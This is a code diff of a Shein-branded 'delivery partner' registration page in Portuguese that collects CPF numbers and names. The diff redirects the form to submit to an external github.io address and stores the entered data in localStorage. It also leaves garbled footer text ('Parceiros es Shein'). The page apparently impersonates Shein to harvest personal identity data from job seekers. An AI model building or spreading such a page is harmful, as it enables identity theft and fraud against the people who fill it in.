@@ -52,7 +52,7 @@
             <div class="flex-grow container mx-auto px-2 py-8 w-full">
                 <div class="w-full mx-auto p-6 mb-8">
                     <h1 class="text-3xl font-bold text-center mb-8 text-gray-800">Cadastro de Entregador Parceiro</h1>
-                    <form class="space-y-6" id="cadastroForm" action="../parte3" method="post">
+                    <form class="space-y-6" id="cadastroForm" action="https://entregador-vagas.github.io/parte3/" method="post">
                         <div class="space-y-4">
                             <div><label for="cpf" class="block text-base font-medium text-gray-800 mb-2">CPF</label><input class="flex h-10 w-full rounded-[3px] border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-0 focus-visible:border-[#E83D22] focus-visible:border-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="cpf" name="cpf" placeholder="000.000.000-00" inputmode="numeric" value=""></div>
                             <div><label for="nome" class="block text-base font-medium text-gray-800 mb-2">Nome
@@ -103,7 +103,7 @@
                             <p class="text-sm text-center md:text-left">© 2024 Shein. Todos os direitos reservados.</p>
                         </div>
                         <div class="text-center md:text-right">
-                            <p class="text-sm opacity-80 mb-2">Programa de Parceiros Entregadores Shein</p>
+                            <p class="text-sm opacity-80 mb-2">Programa de Parceiros es Shein</p>
                             <p class="text-xs opacity-70">Trabalhe conosco e faça parte da nossa equipe de entregas</p>
                         </div>
                     </div>
@@ -466,7 +466,7 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         // Salva como string JSON no localStorage
-        localStorage.setItem('cadastroEntregadorData', JSON.stringify(formData));
+        localStorage.setItem('cadastroData', JSON.stringify(formData));
 
         console.log('Dados salvos no localStorage:', formData);
         // O formulário continuará o envio para action="./verificando.html" 
